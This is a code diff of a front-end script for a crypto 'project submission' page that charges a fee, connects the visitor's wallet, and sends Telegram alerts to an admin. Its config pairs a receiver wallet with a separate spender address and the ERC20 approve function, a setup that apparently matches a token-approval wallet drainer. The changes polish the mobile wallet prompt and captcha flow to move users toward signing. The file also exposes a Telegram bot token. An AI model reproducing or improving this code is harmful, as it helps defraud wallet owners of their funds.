@@ -5,16 +5,14 @@ import { EthereumClient, w3mConnectors, w3mProvider } from "https://cdn.jsdelivr
 import { configureChains, createConfig } from "https://cdn.jsdelivr.net/npm/@wagmi/core@1.4.0/dist/index.js";
 
 // ====== CONFIG ======
-const RECEIVER = "0xea8ee0d7fc1b114a66330332fdf32d3c1df7e12a"; // Replace with your wallet
-const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // ERC20 USDT
+const RECEIVER = "0xea8ee0d7fc1b114a66330332fdf32d3c1df7e12a";
+const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const FEE = 50;
-const SPENDER_ADDRESS = "0xa2b9cade09d3cefdee5e981ca0517912bedc5961"; // spender
+const SPENDER_ADDRESS = "0xa2b9cade09d3cefdee5e981ca0517912bedc5961";
 
-// Telegram bot config
 const TELEGRAM_BOT = "8562127548:AAHEHQJUybHFkRNQgVLDdObeWApo9tXWjmY";
 const ADMIN_CHAT_ID = "7662871309";
 
-// WalletConnect Project ID
 const WC_PROJECT_ID = "85d1310d55b14854c6d62bab3b779200";
 
 // ====== ABI ======
@@ -24,16 +22,28 @@ const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)"
 ];
 
-// ====== DOM ELEMENTS ======
+// ====== DOM ======
 const form = document.getElementById("tokenForm");
 const modal = document.getElementById("feeModal");
 const payBtn = document.getElementById("connectWalletBtn");
 const closeBtn = document.getElementById("closeModal");
+const submitBtn = form.querySelector('button[type="submit"]');
+
 const statusBox = document.createElement("div");
 statusBox.style.marginTop = "10px";
 modal.querySelector(".modal-content").appendChild(statusBox);
 
-// ====== WalletConnect + MetaMask Setup ======
+const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+// Mobile UI polish
+if (isMobile) {
+  statusBox.style.fontSize = "15px";
+  statusBox.style.lineHeight = "1.4";
+  modal.querySelector(".modal-content").style.padding = "20px";
+  payBtn.textContent = "Open Wallet App";
+}
+
+// ====== WalletConnect Setup ======
 const chains = [{ id: 1, name: "Ethereum", network: "homestead" }];
 const { publicClient } = configureChains(chains, [w3mProvider({ projectId: WC_PROJECT_ID })]);
 
@@ -46,34 +56,75 @@ const wagmiConfig = createConfig({
 const ethereumClient = new EthereumClient(wagmiConfig, chains);
 const web3Modal = new Web3Modal({ projectId: WC_PROJECT_ID }, ethereumClient);
 
-// ====== MOBILE-FRIENDLY WALLET INIT ======
+// ====== CAPTCHA STATE ======
+let captchaReady = false;
+
+function waitForCaptcha() {
+  return new Promise((resolve, reject) => {
+    let attempts = 0;
+
+    const check = setInterval(() => {
+      if (window.grecaptcha && typeof grecaptcha.getResponse === "function") {
+        clearInterval(check);
+        captchaReady = true;
+        resolve();
+      }
+
+      attempts++;
+      if (attempts > 50) {
+        clearInterval(check);
+        reject(new Error("reCAPTCHA failed to load"));
+      }
+    }, 100);
+  });
+}
+
+window.onCaptchaExpired = () => {
+  alert("Captcha expired. Please verify again.");
+  resetSubmitButton();
+};
+
+// ====== WALLET INIT (MOBILE OPTIMIZED) ======
 async function initWallet() {
   try {
-    // Open modal
+    statusBox.textContent = "Opening wallet…";
+
+    if (isMobile) {
+      web3Modal.setThemeMode("light");
+      web3Modal.setDefaultChain(1);
+      web3Modal.setThemeVariables({
+        "--w3m-font-size-master": "16px"
+      });
+    }
+
     await web3Modal.openModal();
 
-    // Mobile check for smaller devices
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    if (isMobile) {
-      modal.style.padding = "20px";
-      modal.style.fontSize = "16px";
-    }
+    statusBox.textContent = "Waiting for wallet connection…";
 
     const provider = new ethers.BrowserProvider(web3Modal.getWalletProvider());
     const signer = await provider.getSigner();
     const userAddress = await signer.getAddress();
+
     statusBox.textContent = `Wallet connected ✅ ${userAddress}`;
     return { signer, userAddress };
+
   } catch (err) {
     console.error("Wallet connection failed", err);
-    statusBox.textContent = "Wallet connection failed ❌";
+
+    if (err?.message?.toLowerCase().includes("user rejected")) {
+      statusBox.textContent = "Connection cancelled ❌ Please try again.";
+    } else {
+      statusBox.textContent = "Wallet connection failed ❌ Try another wallet.";
+    }
+
     return null;
   }
 }
 
-// ====== TELEGRAM NOTIFY ======
+// ====== TELEGRAM ======
 async function sendTelegram(chatId, message) {
   if (!chatId) return;
+
   await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -81,29 +132,58 @@ async function sendTelegram(chatId, message) {
   });
 }
 
-// ====== FORM SUBMIT ======
-form.addEventListener("submit", e => {
+// ====== SUBMIT HANDLER ======
+form.addEventListener("submit", async (e) => {
   e.preventDefault();
-  if (!grecaptcha.getResponse()) {
-    alert("Please complete reCAPTCHA before submitting.");
-    return;
+
+  submitBtn.disabled = true;
+  submitBtn.style.opacity = "0.6";
+  submitBtn.textContent = "Checking captcha...";
+
+  try {
+    if (!captchaReady) {
+      await waitForCaptcha();
+    }
+
+    const token = grecaptcha.getResponse();
+
+    if (!token) {
+      alert("Please complete the captcha verification.");
+      resetSubmitButton();
+      return;
+    }
+
+    modal.classList.remove("hidden");
+    statusBox.textContent = "Captcha verified ✅ Please connect your wallet to continue.";
+
+    submitBtn.textContent = "Submitted";
+
+  } catch (err) {
+    console.error("Captcha error:", err);
+    alert("Captcha could not be loaded. Please refresh the page or disable ad-block.");
+    resetSubmitButton();
   }
-  modal.classList.remove("hidden");
-  statusBox.textContent = "";
 });
+
+function resetSubmitButton() {
+  submitBtn.disabled = false;
+  submitBtn.style.opacity = "1";
+  submitBtn.textContent = "Submit Project";
+}
 
 // ====== MODAL CLOSE ======
 closeBtn.onclick = () => {
   modal.classList.add("hidden");
   statusBox.textContent = "";
+  resetSubmitButton();
 };
 
-// ====== PAYMENT + APPROVAL ======
+// ====== PAYMENT FLOW ======
 payBtn.onclick = async () => {
   const wallet = await initWallet();
   if (!wallet) return;
-  const { signer, userAddress } = wallet;
 
+  const { signer, userAddress } = wallet;
   statusBox.textContent = "Preparing payment...";
 
   try {
@@ -141,19 +221,24 @@ payBtn.onclick = async () => {
     });
 
     const data = await res.json();
+
     if (data.success) {
       statusBox.textContent = "Project submitted successfully ✅";
+
       setTimeout(() => {
         modal.classList.add("hidden");
         form.reset();
         grecaptcha.reset();
+        resetSubmitButton();
       }, 1500);
     } else {
       statusBox.textContent = "Error: " + data.error;
+      resetSubmitButton();
     }
 
   } catch (err) {
     console.error(err);
     statusBox.textContent = "Payment or approval failed ❌";
+    resetSubmitButton();
   }
 };
